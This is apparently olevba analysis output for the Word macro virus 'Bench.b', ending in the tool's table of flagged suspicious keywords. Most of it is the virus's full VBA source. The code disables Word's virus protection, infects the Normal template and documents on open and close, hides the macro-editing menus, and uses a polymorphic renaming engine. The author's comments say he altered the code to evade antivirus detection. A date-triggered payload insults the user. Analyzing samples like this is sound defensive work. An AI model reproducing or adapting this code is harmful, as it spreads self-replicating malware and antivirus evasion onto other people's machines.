olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.b-17a43fe349b5e78cc0101a48b9712a294fe1f57f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.b-17a43fe349b5e78cc0101a48b9712a294fe1f57f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Options.ConfirmConversions = False
TP887310 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
GF177465 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Month(Now) = Minute(Now) Then
Randomize: For RL838351 = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next RL838351:
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus"
    .Text = "I think " & Application.UserName & " is a big jerk!"
    .Show
    End With
End If
If TP887310 > 0 And GF177465 > 0 Then GoTo OUT
If TP887310 = 0 Then
Set NA70339 = ActiveDocument.VBProject.VBComponents.Item(1)
KL457383 = True
End If
If GF177465 = 0 Then
Set NA70339 = NormalTemplate.VBProject.VBComponents.Item(1)
TT22483 = True
End If
Call NM345400_FL670288
ActiveDocument.Saved = True
If TT22483 <> True And KL457383 <> True Then GoTo OUT
If TT22483 = True Then NA70339.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TP887310 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub")
If KL457383 = True Then NA70339.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GF177465 - 1))
OUT:
If GF177465 <> 0 And TP887310 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub NM345400_FL670288()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "LO423863"
r1(2) = "FV86321"
r1(3) = "KF532105"
r1(4) = "PG479294"
r1(5) = "FL670288"
r1(6) = "NM345400"
r1(7) = "ID23568"
r1(8) = "UH382794"
r1(9) = "TP887310"
r1(10) = "GF177465"
r1(11) = "NA70339"
r1(12) = "KL457383"
r1(13) = "TT22483"
r1(14) = "RL838351"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call FL670288(a1, r1(x))
Next x
End Sub
Private Sub FL670288(UH382794, ID23568 As String)  'VAMP v1.0 [Thanks VicodinES]
On Error Resume Next
Dim LO423863 As Long: Dim FV86321 As Long: Dim KF532105 As Long: Dim PG479294 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LO423863 = 1: FV86321 = 1: KF532105 = .CountOfLines: PG479294 = Len(.Lines(.CountOfLines, 1))
Do While .Find(ID23568, LO423863, FV86321, KF532105, PG479294, True)
s1 = .Lines(LO423863, 1)
s1 = Left(s1, FV86321 - 1) & UH382794 & Mid(s1, PG479294)
.replaceline LO423863, s1
LO423863 = KF532105 + 1: FV86321 = 1
KF532105 = .CountOfLines
PG479294 = Len(.Lines(.CountOfLines, 1))
Loop
End With
' BMV Strain B - Added Vic's Polymorph Engine - VAMP [Thanks Vic!]
'              - Payload from W97M/PSD - Why? Coz I liked it!
'              - The next strain's payload I'm gonna put more graphics [created by me] And more original code! - Like what Vic says "Be creative!" - I'm sure I haven't done that! =(
'              - Hacked CPCK code - I'm just learning Class Object infection ok! Though I had to edit some stuff so that AVP won't detect it
'              - I want to make a virus everyone wouldn't mind having
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

